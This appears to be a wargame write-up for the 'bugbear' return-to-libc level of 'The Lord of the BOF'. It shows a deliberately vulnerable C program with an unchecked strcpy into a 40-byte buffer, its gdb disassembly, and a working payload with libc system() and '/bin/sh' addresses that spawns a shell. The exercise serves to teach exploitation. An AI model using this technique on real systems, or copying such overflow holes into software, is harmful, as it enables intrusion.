@@ -1,0 +1,85 @@
+[darkknight@localhost darkknight]$ cat bugbear.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - bugbear
+        - RTL1
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+main(int argc, char *argv[])
+{
+        char buffer[40];
+        int i;
+
+        if(argc < 2){
+                printf("argv error\n");
+                exit(0);
+        }
+
+        if(argv[1][47] == '\xbf')
+        {
+                printf("stack betrayed you!!\n");
+                exit(0);
+        }
+
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+}
+
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:       push   %ebp
+0x8048431 <main+1>:     mov    %ebp,%esp
+0x8048433 <main+3>:     sub    %esp,44
+0x8048436 <main+6>:     cmp    DWORD PTR [%ebp+8],1
+0x804843a <main+10>:    jg     0x8048453 <main+35>
+0x804843c <main+12>:    push   0x8048500
+0x8048441 <main+17>:    call   0x8048350 <printf>
+0x8048446 <main+22>:    add    %esp,4
+0x8048449 <main+25>:    push   0
+0x804844b <main+27>:    call   0x8048360 <exit>
+0x8048450 <main+32>:    add    %esp,4
+0x8048453 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
+0x8048456 <main+38>:    add    %eax,4
+0x8048459 <main+41>:    mov    %edx,DWORD PTR [%eax]
+0x804845b <main+43>:    add    %edx,47
+0x804845e <main+46>:    cmp    BYTE PTR [%edx],0xbf
+0x8048461 <main+49>:    jne    0x8048480 <main+80>
+0x8048463 <main+51>:    push   0x804850c
+0x8048468 <main+56>:    call   0x8048350 <printf>
+0x804846d <main+61>:    add    %esp,4
+0x8048470 <main+64>:    push   0
+0x8048472 <main+66>:    call   0x8048360 <exit>
+0x8048477 <main+71>:    add    %esp,4
+0x804847a <main+74>:    lea    %esi,[%esi]
+0x8048480 <main+80>:    mov    %eax,DWORD PTR [%ebp+12]
+0x8048483 <main+83>:    add    %eax,4
+0x8048486 <main+86>:    mov    %edx,DWORD PTR [%eax]
+0x8048488 <main+88>:    push   %edx
+0x8048489 <main+89>:    lea    %eax,[%ebp-40]
+0x804848c <main+92>:    push   %eax
+0x804848d <main+93>:    call   0x8048370 <strcpy>
+0x8048492 <main+98>:    add    %esp,8
+0x8048495 <main+101>:   lea    %eax,[%ebp-40]
+0x8048498 <main+104>:   push   %eax
+0x8048499 <main+105>:   push   0x8048522
+0x804849e <main+110>:   call   0x8048350 <printf>
+0x80484a3 <main+115>:   add    %esp,8
+0x80484a6 <main+118>:   leave
+0x80484a7 <main+119>:   ret
+
+----------------------------------------------------------------
+
+1. system() 함수의 메모리주소:
+: 0x40058ae0
+
+2. "/bin/sh" 메모리 주소
+: 0x400fbff9
+
+buffer[40] + SFP[4] + RET[4] + system's RET[4] + system's param[4]
+"\x90"x40,"AAAA","\xe0\x8a\x05\x40","BBBB","\xf9\xbf\x0f\x40"
+
+
+
+
